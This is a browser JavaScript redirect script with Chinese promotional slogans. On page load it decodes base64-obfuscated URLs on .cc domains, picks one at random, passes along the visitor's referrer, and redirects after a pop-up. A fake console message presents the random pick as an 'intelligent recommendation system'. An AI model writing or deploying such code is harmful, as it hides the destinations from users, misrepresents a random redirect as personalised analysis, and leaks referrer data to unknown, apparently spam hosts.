const urls = [
  'aHR0cHM6Ly/lsZXN0LmJhaWR1MTEuY2Mv5paw5L+dLw==',
  'aHR0cHM6Ly/ndWd1YW4uc21kejExLmNjL+WZqOeptuW9uC8=',
  'aHR0cHM6Ly/nuKPlpKflrabnsr7luILmnJ8uYWluaTY2LmNjL+WcqOacn+mZog=='
];

const quotes = [
  "每一次点击，都是一次新的可能。",
  "不要犹豫，精彩就在前方！",
  "为你精选，直达福利新天地。",
  "逗妇乳导航，链接你的互联网灵感。"
];

function decodeBase64(str) {
  try {
    return decodeURIComponent(escape(window.atob(str)));
  } catch {
    return '';
  }
}

function showQuote() {
  const quote = quotes[Math.floor(Math.random() * quotes.length)];
  document.getElementById("quote").innerText = quote;
}

function getRefParam() {
  const urlParams = new URLSearchParams(window.location.search);
  const ref = urlParams.get('ref') || document.referrer || '';
  return ref ? '?ref=' + encodeURIComponent(ref) : '';
}

function redirectUser() {
  const selected = urls[Math.floor(Math.random() * urls.length)];
  const url = decodeBase64(selected);
  const ref = getRefParam();

  console.log("🤖 智能推荐系统已启动：分析中...");

  setTimeout(() => {
    alert("✅ 为你推荐了一条最适合的链接，准备跳转咯！");
    window.location.href = url + ref;
  }, 1500);
}

showQuote();
redirectUser();
